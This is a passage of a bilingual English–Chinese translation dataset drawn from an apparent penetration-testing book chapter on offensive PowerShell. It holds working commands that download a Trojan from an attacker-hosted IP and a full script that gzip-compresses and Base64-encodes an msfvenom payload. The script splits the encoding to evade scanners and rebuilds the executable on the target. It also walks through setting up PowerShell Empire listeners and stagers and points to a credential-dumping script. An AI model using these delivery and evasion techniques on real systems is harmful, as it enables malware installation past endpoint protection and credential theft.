    TCP 客户端模块，尝试连接该端口。**2>$null** 会将 **STDERR** 丢弃；换句话说，返回的错误意味着端口没有开放，响应会被丢弃。
- en: We know from TCP and working with tools such as Nmap that there is a variety
    of port scanning strategies; for example, half-open scanning, where SYNs are sent
    to elicit the **SYN-ACK** response of an open port, but without completing the
    handshake with an **ACK** **value**. So, what is happening behind the scenes with
    our quick and dirty port scanner script? It’s a **Connect** module for **TcpClient**
    – it’s designed to create TCP connections. It doesn’t know that it’s being used
    for port scanning. It’s attempting to create full three-way handshakes and it
    will return successfully if the handshake is completed. We must understand what’s
    happening on the network.
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 我们从 TCP 和使用 Nmap 等工具的经验中知道，端口扫描策略有很多种；例如，半开扫描，其中 SYN 数据包被发送以引发开放端口的 **SYN-ACK**
    响应，但没有通过 **ACK** **值** 完成握手。那么，在我们的快速且简易的端口扫描脚本背后到底发生了什么呢？它是一个 **Connect** 模块，用于
    **TcpClient** – 该模块旨在创建 TCP 连接。它并不知道自己被用来做端口扫描。它正在尝试建立完整的三次握手，并且如果握手完成，它会成功返回。我们必须理解网络上发生了什么。
- en: Since we’re talking to the network, let’s see what we can get away with when
    we need to get malicious programs onto a target.
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 既然我们在与网络通信，那就让我们看看在需要将恶意程序传送到目标时，能做些什么。
- en: Delivering a Trojan to your target via PowerShell
  id: totrans-86
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 通过 PowerShell 向目标传送 Trojan
- en: You have PowerShell access. You have a Trojan sitting on your Kali box that
    you need to deliver to the target. Here, you can host the file on your Kali box
    and use PowerShell to avoid pesky browser alerts and memory utilization.
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: 你有 PowerShell 访问权限。你有一个 Trojan 文件放在 Kali 主机上，需要将其传送给目标。在这里，你可以将文件托管在 Kali 主机上，并使用
    PowerShell 来避免恼人的浏览器警告和内存占用。
- en: 'First, we’re hosting the file with **python -m SimpleHTTPServer 80**, which
    is executed inside the folder containing the Trojan. When we’re ready, we can
    execute a PowerShell command that utilizes **WebClient** to download the file
    and write it to a local path:'
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，我们使用 **python -m SimpleHTTPServer 80** 来托管文件，该命令在包含 Trojan 的文件夹中执行。当准备好后，我们可以执行一个
    PowerShell 命令，利用 **WebClient** 下载文件并将其写入本地路径：
- en: (New-Object System.Net.WebClient).DownloadFile("http://192.168.63.143/attack1.exe",
    "c:\windows\temp\attack1.exe")
  id: totrans-89
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: (New-Object System.Net.WebClient).DownloadFile("http://192.168.63.143/attack1.exe",
    "c:\windows\temp\attack1.exe")
- en: 'Let’s see what this looks like when we execute it and run **ls** to validate:'
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们看看在执行命令并运行 **ls** 验证时会是什么样子：
- en: '![Figure 9.9 – Downloading an EXE from an HTTP server ](image/Figure_9.9_B17616.jpg)'
  id: totrans-91
  prefs: []
  type: TYPE_IMG
  zh: '![图 9.9 – 从 HTTP 服务器下载 EXE 文件](image/Figure_9.9_B17616.jpg)'
- en: Figure 9.9 – Downloading an EXE from an HTTP server
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.9 – 从 HTTP 服务器下载 EXE 文件
- en: It’s important to note that the destination path isn’t arbitrary; it must exist.
    This one-liner isn’t going to create a directory for you, so if you try to just
    throw it anywhere without confirming its presence on the host, you may pull an
    exception. Assuming this isn’t an issue, and the command has finished running,
    we can **cd** into the chosen directory and see our executable ready to go.
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 需要注意的是目标路径不是任意的；它必须存在。这个一行命令不会为你创建一个目录，所以如果你试图将其放在任何地方而没有确认主机上是否存在，可能会引发异常。假设这不是问题，并且命令已经执行完毕，我们可以**cd**进入选择的目录，看到我们的可执行文件已经准备就绪。
- en: I know what you’re thinking, though – *pulling an EXE file from the network
    like this isn't exactly stealthy*. Right you are. Any endpoint protection product
    worth its salt will immediately nab this attempt. What we need to do is think
    about how we can smuggle the file in by converting it into something less suspicious
    than plain executable code. What if we converted our malicious binary into Base64?
    Then, we could write it into a plain text file, and PowerShell can treat it like
    an ordinary string. Let’s take a closer look.
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 不过我知道你在想什么 - *像这样从网络中提取EXE文件并不是特别隐秘*。你说得对。任何值得一试的终端保护产品都会立即抓住这种尝试。我们需要考虑如何通过将文件转换为比普通可执行代码更不可疑的东西来偷运文件。如果我们将恶意二进制文件转换为Base64呢？然后，我们可以将其写入一个纯文本文件，PowerShell可以像处理普通字符串一样处理它。让我们仔细看看。
- en: Encoding and decoding binaries in PowerShell
  id: totrans-95
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 在PowerShell中对二进制进行编码和解码
- en: 'First, we’re going to switch back to our Kali box and create a quick executable
    bug with **msfvenom.** Then, we’re going to send it over to our Windows box by
    serving it up with **SimpleHTTPServer**:'
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，我们将切换回我们的Kali系统，并使用**msfvenom**创建一个快速可执行的漏洞。然后，我们将通过使用**SimpleHTTPServer**将其发送到我们的Windows系统：
- en: '![Figure 9.10 – Building and serving the malicious executable ](image/Figure_9.10_B17616.jpg)'
  id: totrans-97
  prefs: []
  type: TYPE_IMG
  zh: '![图9.10 – 构建和提供恶意可执行文件](image/Figure_9.10_B17616.jpg)'
- en: Figure 9.10 – Building and serving the malicious executable
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 图9.10 – 构建和提供恶意可执行文件
- en: 'I’m calling this file **sneaky.exe** for this example. Now, let’s work our
    magic and read the raw bytes out of the EXE, compress the result, then convert
    it into Base64\. Let’s get cracking:'
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: 对于这个示例，我将这个文件称为**sneaky.exe**。现在，让我们施展魔法，从EXE文件中读取原始字节，压缩结果，然后将其转换为Base64。让我们开始吧：
- en: $rawData = [System.IO.File]::ReadAllBytes("C:\Users\bramw\Downloads\sneaky.exe")
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: $rawData = [System.IO.File]::ReadAllBytes("C:\Users\bramw\Downloads\sneaky.exe")
- en: $memStream = New-Object IO.MemoryStream
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: $memStream = New-Object IO.MemoryStream
- en: $compressStream = New-Object System.IO.Compression.GZipStream ($memStream, [IO.Compression.CompressionMode]::Compress)
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: $compressStream = New-Object System.IO.Compression.GZipStream ($memStream, [IO.Compression.CompressionMode]::Compress)
- en: $compressStream.Write($rawData, 0, $rawData.Length)
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: $compressStream.Write($rawData, 0, $rawData.Length)
- en: $compressStream.Close()
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: $compressStream.Close()
- en: $compressedRaw = $memStream.ToArray()
  id: totrans-105
  prefs: []
  type: TYPE_NORMAL
  zh: $compressedRaw = $memStream.ToArray()
- en: $b64Compress = [Convert]::ToBase64String($compressedRaw)
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: $b64Compress = [Convert]::ToBase64String($compressedRaw)
- en: $b64Compress | Out-File b64Compress.txt
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: $b64Compress | Out-File b64Compress.txt
- en: 'Let’s examine what just happened step by step. Note that we’re using PowerShell
    to interact with .NET – tremendous power in a snap:'
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们逐步分析刚刚发生的事情。请注意，我们正在使用PowerShell与.NET进行交互 - 在一瞬间获得巨大的力量：
- en: Under the **System.IO** namespace, the **File** class contains the **ReadAllBytes**
    method. This simply opens a binary and reads the result into a byte array, which
    we are calling **$rawData**.
  id: totrans-109
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在**System.IO**命名空间下，**File**类包含**ReadAllBytes**方法。这只是打开一个二进制文件并将结果读入一个字节数组，我们称之为**$rawData**。
- en: Next, we create a **MemoryStream** object called **$memStream**, where we’ll
    pack up the raw bytes using the **GZipStream** class. In other words, we’ll compress
    the contents of **$rawData** with the gzip file format specification.
  id: totrans-110
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，我们创建一个名为**$memStream**的**MemoryStream**对象，在这里我们将使用**GZipStream**类打包原始字节。换句话说，我们将使用gzip文件格式规范压缩**$rawData**的内容。
- en: Then, we create another array of raw bytes, **$compressedRaw**, but this time
    the data is our original byte array compressed with gzip.
  id: totrans-111
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 然后，我们创建另一个原始字节数组**$compressedRaw**，但这次数据是我们原始字节数组使用gzip压缩后的结果。
- en: Finally, we convert the compressed byte array into a Base64 string. At this
    point, we can treat **$b64Compress** like any other string; in our example, we
    wrote it into a text file.
  id: totrans-112
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 最后，我们将压缩的字节数组转换为Base64字符串。此时，我们可以像对待其他字符串一样处理**$b64Compress**；在我们的示例中，我们将其写入了一个文本文件。
- en: Now, you can open this text file just like you would any other plain text file.
    Why not write it on a napkin in crayon and give it to your buddies?
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，你可以像打开任何其他纯文本文件一样打开这个文本文件。为什么不用蜡笔在餐巾纸上写下它，然后给你的朋友呢？
- en: '![Figure 9.11 – Plain text Base64 representation of our binary ](image/Figure_9.11_B17616.jpg)'
  id: totrans-114
  prefs: []
  type: TYPE_IMG
  zh: '![图 9.11 – 我们二进制文件的纯文本Base64表示](image/Figure_9.11_B17616.jpg)'
- en: Figure 9.11 – Plain text Base64 representation of our binary
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.11 – 我们二进制文件的纯文本Base64表示
- en: 'The possibilities are limited by your imagination, but in our example, I served
    up the plain text to be fetched by my PowerShell script within the target environment.
    Let’s not underestimate the defenders: even though it’s ordinary text, it’s also
    obviously Base64 and it isn’t encrypted, so a quick scan would reveal its purpose.
    When I tried to email it to myself, Gmail was on to us, as shown in the following
    screenshot:'
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: 可能性受你的想象力限制，但在我们的例子中，我提供了纯文本供我的PowerShell脚本在目标环境中获取。让我们不要低估防御者：尽管这是普通文本，但显然是Base64且未加密，因此快速扫描就会揭示其目的。当我试图将其通过电子邮件发送给自己时，Gmail已经发现了我们，如下面的截图所示：
- en: '![Figure 9.12 – Nice catch, Google! ](image/Figure_9.12_B17616.jpg)'
  id: totrans-117
  prefs: []
  type: TYPE_IMG
  zh: '![图 9.12 – Google发现了！](image/Figure_9.12_B17616.jpg)'
- en: Figure 9.12 – Nice catch, Google!
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.12 – Google发现了！
- en: 'Fear not, as this clever scan considered all the binary data. Snip off a few
    letters and it will end up mangled. Again, the possibilities are limited only
    by your imagination, but the idea is that you create a *jigsaw puzzle* made up
    of pieces of Base64 code that you will merely concatenate on the receiving end.
    In our example, let’s just snip off the first five characters from our text file
    and then serve the remaining characters on the network. Let’s take a look:'
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
  zh: 不用担心，因为这个聪明的扫描考虑了所有的二进制数据。剪掉几个字母，它就会变得混乱。再次强调，可能性仅受你的想象力限制，但想法是你创建一个由Base64代码片段组成的*拼图*，然后在接收端简单地连接起来。在我们的例子中，让我们从文本文件中剪掉前五个字符，然后将剩余字符发送到网络上。让我们来看一下：
- en: Invoke-WebRequest -Uri "http://192.168.108.211:8000/sneaky.txt" -OutFile "fragment.txt"
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: Invoke-WebRequest -Uri "http://192.168.108.211:8000/sneaky.txt" -OutFile "fragment.txt"
- en: $fragment = Get-Content -Path "fragment.txt"
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: $fragment = Get-Content -Path "fragment.txt"
- en: $final = "H4sIA" + $fragment
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: $final = "H4sIA" + $fragment
- en: $compressedFromb64 = [Convert]::FromBase64String($final)
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
  zh: $compressedFromb64 = [Convert]::FromBase64String($final)
- en: $memoryStream = New-Object io.MemoryStream( , $compressedFromb64)
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: $memoryStream = New-Object io.MemoryStream( , $compressedFromb64)
- en: $compressStream = New-Object System.io.Compression.GZipStream($memoryStream,
    [io.Compression.CompressionMode]::Decompress)
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: $compressStream = New-Object System.io.Compression.GZipStream($memoryStream,
    [io.Compression.CompressionMode]::Decompress)
- en: $finalStream = New-Object io.MemoryStream
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: $finalStream = New-Object io.MemoryStream
- en: $compressStream.CopyTo($finalStream)
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
  zh: $compressStream.CopyTo($finalStream)
- en: $DesktopPath = [Environment]::GetFolderPath("Desktop")
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
  zh: $DesktopPath = [Environment]::GetFolderPath("Desktop")
- en: $TargetPath = $DesktopPath + "\NotNaughty.exe"
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
  zh: $TargetPath = $DesktopPath + "\NotNaughty.exe"
- en: '[IO.File]::WriteAllBytes($TargetPath, $finalStream.ToArray())'
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: '[IO.File]::WriteAllBytes($TargetPath, $finalStream.ToArray())'
- en: We can do all of this with fewer lines, but I laid it out like this so that
    we can see each stage of the attack. Once our script has pulled the fragment,
    we simply concatenate the missing piece and save it as **$final**. Thus, **$final**
    now contains Base64-encoded, gzip-compressed binary code in EXE format. We can
    use the same methods that we did previously in reverse, and then use the **WriteAllBytes**
    method to recreate the EXE on our end. Combine this trick with the malware evasion
    techniques we discussed previously in this book and you have yourself a powerful
    channel for smuggling your tools into the target environment.
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以用更少的行数完成所有这些操作，但我将它们列出来，以便我们可以看到攻击的每个阶段。一旦我们的脚本提取了片段，我们只需连接缺失的部分并将其保存为**$final**。因此，**$final**现在包含以EXE格式的Base64编码、gzip压缩的二进制代码。我们可以使用之前讨论过的相同方法反向操作，然后使用**WriteAllBytes**方法在我们这一端重新创建EXE。将这个技巧与本书中之前讨论的恶意软件规避技术相结合，你就拥有了一个强大的渠道，可以将你的工具偷偷带入目标环境。
- en: Just as everything in Metasploit can be done manually, thankfully, we have a
    framework in our work bag that will ease the manual tasks of developing powerful
    PowerShell attacks. Let’s take a look at the Empire framework.
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: 正如Metasploit中的一切都可以手动完成一样，幸运的是，我们在工具包中有一个框架，可以简化开发强大的PowerShell攻击的手动任务。让我们来看看Empire框架。
- en: Offensive PowerShell – introducing the Empire framework
  id: totrans-133
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Offensive PowerShell – 介绍Empire框架
- en: The fact that we can sit down at a Windows box and use PowerShell to interact
    with the operating system so intimately is certainly a Windows administrator’s
    dream come true. As attackers, we see the parts for a precision-guided missile,
    and we only need the time to construct it. In a pen test, we just don’t have the
    time to write the perfect PowerShell script on the fly, so the average pen tester
    has a candy bag full of homegrown scripts for certain tasks. One of the scripts
    I used client after client did nothing more than poke around for open ports and
    dump the IP addresses into text files inside folders named after the open port.
    Things like that sound mundane and borderline pointless – until you’re out in
    the field and realize you’ve saved dozens of hours.
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: 我们能够坐在 Windows 机器前，通过 PowerShell 与操作系统如此紧密地互动，毫无疑问是 Windows 管理员的梦想成真。作为攻击者，我们看到的是精确制导导弹的各个部件，我们只需要时间去构建它。在渗透测试中，我们通常没有时间即时编写完美的
    PowerShell 脚本，因此大多数渗透测试员都有一个装满自制脚本的“糖果袋”，用于执行某些任务。我使用的一个脚本，客户端一个接一个地运行，做的仅仅是扫描开放端口，并将
    IP 地址转储到按开放端口命名的文件夹中的文本文件里。像这样的事情看起来平淡无奇，甚至有些无意义——直到你身处现场，意识到你已经节省了数十个小时。
- en: The advanced security professional sees tools such as Metasploit in this light
    – a framework for organized, efficient, and tidy delivery of our tools for when
    the built-in set doesn’t cut it. In the world of PowerShell, there is a framework
    that automates the task of staging and managing a communications channel with
    our target for sophisticated PowerShell attacks. Welcome to the Empire.
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: 高级安全专家会以这种方式看待像 Metasploit 这样的工具——它是一个框架，用于有组织、高效和整洁地传递工具，当内置的工具集无法满足需求时。在 PowerShell
    的世界中，有一个框架自动化了引导和管理与目标的通信通道，以进行复杂的 PowerShell 攻击。欢迎来到 Empire。
- en: Installing and introducing PowerShell Empire
  id: totrans-136
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 安装并引入 PowerShell Empire
- en: 'Let’s introduce PowerShell Empire by taking a hands-on look at it. Installing
    it is a snap, but first, we’ll update **apt**:'
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们通过动手实践来介绍 PowerShell Empire。安装非常简单，但首先我们需要更新 **apt**：
- en: '![Figure 9.13 – Installing PowerShell Empire on Kali ](image/Figure_9.13_B17616.jpg)'
  id: totrans-138
  prefs: []
  type: TYPE_IMG
  zh: '![图9.13 – 在 Kali 上安装 PowerShell Empire](image/Figure_9.13_B17616.jpg)'
- en: Figure 9.13 – Installing PowerShell Empire on Kali
  id: totrans-139
  prefs: []
  type: TYPE_NORMAL
  zh: 图9.13 – 在 Kali 上安装 PowerShell Empire
- en: 'Once it’s been installed, you can start the team server with the following
    command:'
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
  zh: 安装完成后，你可以通过以下命令启动团队服务器：
- en: powershell-empire server
  id: totrans-141
  prefs: []
  type: TYPE_NORMAL
  zh: powershell-empire 服务器
- en: That’s right – red-teaming made easy with PowerShell Empire. Note the RESTful
    API hosted on port **1337**, as well – a lot of automation can be built with your
    favorite language, allowing you to do the work of many attackers from one PC on
    a tight schedule.
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: 没错——使用 PowerShell Empire 轻松进行红队攻击。注意 RESTful API 也托管在 **1337** 端口上——可以用你最喜欢的编程语言进行大量自动化，使你能够在有限的时间内从一台
    PC 上完成多名攻击者的工作。
- en: 'For now, let’s just fire up the Empire client in a new window:'
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，让我们在一个新窗口中启动 Empire 客户端：
- en: powershell-empire client
  id: totrans-144
  prefs: []
  type: TYPE_NORMAL
  zh: powershell-empire 客户端
- en: Notice anything in particular about this client interface?
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
  zh: 你注意到这个客户端界面有什么特别之处吗？
- en: '![Figure 9.14 – The client window for Empire ](image/Figure_9.14_B17616.jpg)'
  id: totrans-146
  prefs: []
  type: TYPE_IMG
  zh: '![图9.14 – Empire 客户端窗口](image/Figure_9.14_B17616.jpg)'
- en: Figure 9.14 – The client window for Empire
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
  zh: 图9.14 – Empire 客户端窗口
- en: 'That’s right – it has Metasploit’s look and feel. Check out the status above
    the prompt: it’s telling us that three principal components make Empire tick.
    These are *modules*, *listeners*, and *agents*. Though it isn’t displayed here,
    an equally important fourth component is *stagers*. These concepts will become
    clearer as we dive in, but let’s look at them in more detail:'
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
  zh: 没错——它具有 Metasploit 的外观和感觉。看看提示符上方的状态：它告诉我们 Empire 的运作依赖于三个主要组件。这些组件是 *模块*、*监听器*
    和 *代理*。虽然这里没有显示，但同样重要的第四个组件是 *引导程序*。这些概念在我们深入探讨时会变得更清晰，但让我们先更详细地了解它们：
- en: A *module* is essentially the same concept as a module in Metasploit – it’s
    a piece of code that conducts a particular task and serves as our attack’s payload.
  id: totrans-149
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '*模块* 本质上与 Metasploit 中的模块概念相同——它是一段执行特定任务的代码，充当我们攻击的有效载荷。'
- en: 'A *listener* is self-explanatory: this will run on the local Kali machine and
    wait for the connection back from a compromised target.'
  id: totrans-150
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '*监听器* 是不言而喻的：它将在本地 Kali 机器上运行，并等待来自被攻陷目标的回连。'
- en: '*Agents* are meant to reside on a target, which helps persist the connection
    between the attacker and the target. They take module commands to execute on the
    target.'
  id: totrans-151
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '*代理* 用于驻留在目标上，帮助保持攻击者与目标之间的连接。它们接受模块命令并在目标上执行。'
- en: '*Stagers* are the same as they are in Metasploit: pieces of code that set the
    stage for our module to run on the compromised host. Think of it as the communications
    broker between the attacker and the target.'
  id: totrans-152
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '*加载器*与 Metasploit 中一样：它是为我们的模块在被攻陷的主机上运行做准备的代码片段。把它看作是攻击者与目标之间的通信中介。'
- en: 'Let’s start with the most important command for first-time users – **help**:'
  id: totrans-153
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们从首次使用者最重要的命令开始——**help**：
- en: '![Figure 9.15 – Empire’s help menu ](image/Figure_9.15_B17616.jpg)'
  id: totrans-154
  prefs: []
  type: TYPE_IMG
  zh: '![图 9.15 – Empire 的帮助菜单](image/Figure_9.15_B17616.jpg)'
- en: Figure 9.15 – Empire’s help menu
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.15 – Empire 的帮助菜单
- en: 'Have you noticed that both PowerShell and PowerShell Empire make learning on
    the go easy? You can fire off **help** at any time to see the supported commands
    and learn more about them. Did you notice that 396 modules were loaded? You can
    quickly review those as well – type **usemodule** with a space on the end and
    use the arrow keys to browse the list:'
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
  zh: 你注意到 PowerShell 和 PowerShell Empire 让随时学习变得轻松吗？你可以随时输入**help**查看支持的命令并了解更多信息。你注意到加载了
    396 个模块吗？你也可以快速浏览它们——输入**usemodule**，后面加个空格，然后使用箭头键浏览列表：
- en: '![Figure 9.16 – Autocomplete in Empire ](image/Figure_9.16_B17616.jpg)'
  id: totrans-157
  prefs: []
  type: TYPE_IMG
  zh: '![图 9.16 – Empire 中的自动补全](image/Figure_9.16_B17616.jpg)'
- en: Figure 9.16 – Autocomplete in Empire
  id: totrans-158
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.16 – Empire 中的自动补全
- en: Note the overlap with Metasploit in both module tree layout and even functionality.
    What distinguishes Empire, then? Well, you know how I feel about just telling
    you when we could be looking at the PowerShell scripts ourselves, right?
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: 注意与 Metasploit 在模块树布局和功能上的重叠。那么，Empire 有什么不同呢？嗯，你知道我怎么想的，不是吗？我们完全可以自己查看这些 PowerShell
    脚本，而不是我只告诉你。
- en: 'In a new window, use **cd Empire/data/module_source/credentials** to change
    to the credentials module’s source directory, and then list the contents with
    **ls**:'
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: 在新窗口中，使用**cd Empire/data/module_source/credentials**切换到凭证模块的源目录，然后使用**ls**列出目录内容：
- en: '![Figure 9.17 – Taking a peek at the raw scripts ](image/Figure_9.17_B17616.jpg)'
  id: totrans-161
  prefs: []
  type: TYPE_IMG
  zh: '![图 9.17 – 看一看原始脚本](image/Figure_9.17_B17616.jpg)'
- en: Figure 9.17 – Taking a peek at the raw scripts
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.17 – 看一看原始脚本
- en: 'Check it out: **.ps1** files. Let’s crack one open. Execute **vim dumpCredStore.ps1**:'
  id: totrans-163
  prefs: []
  type: TYPE_NORMAL
  zh: 看这个：**.ps1** 文件。我们来打开一个看看。执行 **vim dumpCredStore.ps1**：
- en: '![Figure 9.18 – Taking a peek inside a credentials nabber script ](image/Figure_9.18_B17616.jpg)'
  id: totrans-164
  prefs: []
  type: TYPE_IMG
  zh: '![图 9.18 – 看一看凭证窃取脚本](image/Figure_9.18_B17616.jpg)'
- en: Figure 9.18 – Taking a peek inside a credentials nabber script
  id: totrans-165
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.18 – 看一看凭证窃取脚本
- en: These are quite sophisticated and powerful PowerShell scripts. Now, I know what
    the hacker in you is saying – “*Just as we wrote up modules for Metasploit in
    Ruby, I can write up some PowerShell scripts and incorporate them into my attacks
    with Empire*.” Jolly well done. I leave that exercise to you because we need to
    get back to learning how to set up an Empire attack with listeners, stagers, and
    agents.
  id: totrans-166
  prefs: []
  type: TYPE_NORMAL
  zh: 这些都是相当复杂和强大的 PowerShell 脚本。现在，我知道你心中的黑客在想什么——“*就像我们用 Ruby 为 Metasploit 写模块一样，我也可以写一些
    PowerShell 脚本并将其融入到我的 Empire 攻击中*。”做得好。我把这个任务留给你，因为我们需要回到学习如何通过监听器、加载器和代理来设置 Empire
    攻击的正题上。
- en: Configuring listeners
  id: totrans-167
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 配置监听器
- en: 'In theory, you could start working on, say, an agent right off the bat. You
    can’t get anywhere without a listener, though. You shouldn’t venture out into
    the jungle without a way to get back home. From the main Empire prompt, type **listeners**
    and hit *Enter*:'
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: 理论上，你可以从一开始就着手开发一个代理。但没有监听器，你是无法前进的。没有回家的路，你是无法深入丛林的。从 Empire 主提示符开始，输入**listeners**并按*Enter*：
- en: '![Figure 9.19 – The listeners interface ](image/Figure_9.19_B17616.jpg)'
  id: totrans-169
  prefs: []
  type: TYPE_IMG
  zh: '![图 9.19 – 监听器界面](image/Figure_9.19_B17616.jpg)'
- en: Figure 9.19 – The listeners interface
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.19 – 监听器界面
- en: Note that this changes the prompt; the CLI uses an iOS-like style for entering
    configuration modes. You’re now in **listeners** mode, so typing **help** again
    will show you the **listeners** help menu.
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
  zh: 请注意，这会改变提示符；CLI 使用类似 iOS 的风格来进入配置模式。你现在处于**监听器**模式，因此再次输入**help**将显示**监听器**帮助菜单。
- en: 'Now, type **uselistener** with a space on the end to show the available listeners.
    The HTTP listener sounds like a good idea – port **80** tends to be open on firewalls.
    Complete the **uselistener/http** command and then check the options with **info**:'
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，输入**uselistener**并在末尾加个空格，显示可用的监听器。HTTP 监听器听起来是个不错的选择——端口 **80** 在防火墙上通常是开放的。完成**uselistener/http**命令，然后使用**info**查看选项：
- en: '![Figure 9.20 – The interface for a specific listener ](image/Figure_9.20_B17616.jpg)'
  id: totrans-173
  prefs: []
  type: TYPE_IMG
  zh: '![图 9.20 – 特定监听器的界面](image/Figure_9.20_B17616.jpg)'
- en: Figure 9.20 – The interface for a specific listener
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.20 – 特定监听器的界面
- en: If this isn’t looking familiar to you yet, now you’ll see the interface smacks
    of Metasploit. Isn’t it cozy? It kind of makes me want to curl up with some hot
    cocoa.
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
  zh: 如果这看起来你不熟悉，现在你会看到这个界面让人想起 Metasploit。是不是很温馨？这让我想喝杯热可可，蜷缩起来。
- en: You’ll notice the options default to everything you need, so you could just
    fire off **execute** to set it up. There are a lot of options, though, so consider
    your environment and goals. If you change the host to HTTPS, Empire will configure
    it accordingly on the backend, but you’ll need a certificate. Empire comes with
    a self-signed certificate generator that will place the result in the correct
    folder – run **cert.sh** from within the **setup** folder. For now, I’m using
    plain HTTP. You’ll need to configure the listening port with **set Port 80**.
    Once you execute it, type **main** to go back to the main Empire prompt. Notice
    that the **listeners** count is now **1**. Now, let’s learn how to configure stagers.
  id: totrans-176
  prefs: []
  type: TYPE_NORMAL
  zh: 你会注意到，选项默认设置了你所需的一切，所以你可以直接执行 **execute** 来进行设置。虽然有很多选项，但请根据你的环境和目标考虑选择。如果你将主机改为
    HTTPS，Empire 会在后台相应地进行配置，但你需要一个证书。Empire 附带一个自签名证书生成器，它会将结果放在正确的文件夹中——只需在 **setup**
    文件夹内运行 **cert.sh**。目前，我正在使用普通的 HTTP。你需要使用 **set Port 80** 来配置监听端口。执行后，输入 **main**
    返回到 Empire 的主提示符。注意，**listeners** 的数量现在是 **1**。现在，我们来学习如何配置 stager。
- en: Configuring stagers
  id: totrans-177
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 配置 stager
- en: 'Type **usestager** with a space on the end to see the stagers that are available
    to us:'
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
  zh: 输入 **usestager** 后加空格来查看我们可以使用的 stager：
- en: '![Figure 9.21 – Autocomplete with usestager ](image/Figure_9.21_B17616.jpg)'
  id: totrans-179
  prefs: []
  type: TYPE_IMG
  zh: '![图 9.21 – 使用 usestager 的自动补全](image/Figure_9.21_B17616.jpg)'
- en: Figure 9.21 – Autocomplete with usestager
  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.21 – 使用 usestager 的自动补全
- en: 'As you can see, there’s social engineering potential here; I’ll leave it to
    your creativity to develop ways to convince users to execute a malicious macro
